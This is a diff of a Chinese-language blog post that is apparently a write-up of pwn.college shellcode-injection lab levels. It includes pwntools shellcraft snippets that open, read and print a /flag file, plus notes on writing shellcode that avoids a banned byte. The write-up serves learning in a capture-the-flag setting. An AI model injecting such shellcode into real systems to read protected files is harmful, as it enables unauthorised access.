@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,22 +263,14 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-sgUmgJhn" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
-
-
+    <div id="aplayer-NCSFlWZX" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 <p>​        整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。</p>
 <p>​        如果要将服务器的文件传输到本地的话可以使用:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径]</span><br></pre></td></tr></table></figure>
-
-
-
 <h4><span id="level1">Level1</span></h4><p>​        可以用pwntools的shellcraft模块，但是也可以手写shellcode。</p>
 <p>​        这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。至于为什么，可能只有这一块可写可读？</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.amd64.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)		</span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="string">&#x27;rax&#x27;</span>, addr + <span class="number">0x100</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>, addr + <span class="number">0x100</span>, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
-
 <h4><span id="level2">Level2</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.amd64.nop()*<span class="number">0x800</span></span><br><span class="line">shellcode = shellcraft.amd64.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)		</span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="string">&#x27;rax&#x27;</span>, stack + <span class="number">0x100</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>, stack + <span class="number">0x100</span>, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
-
 <h4><span id="level3">Level3</span></h4><p>​        还是和第一个差不多。</p>
 <h4><span id="level4">Level4</span></h4><p>​        shellcode不能含有”H”。</p>
 <p>​        第一个想到的就是不能含有<code>push</code>，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过）</p>
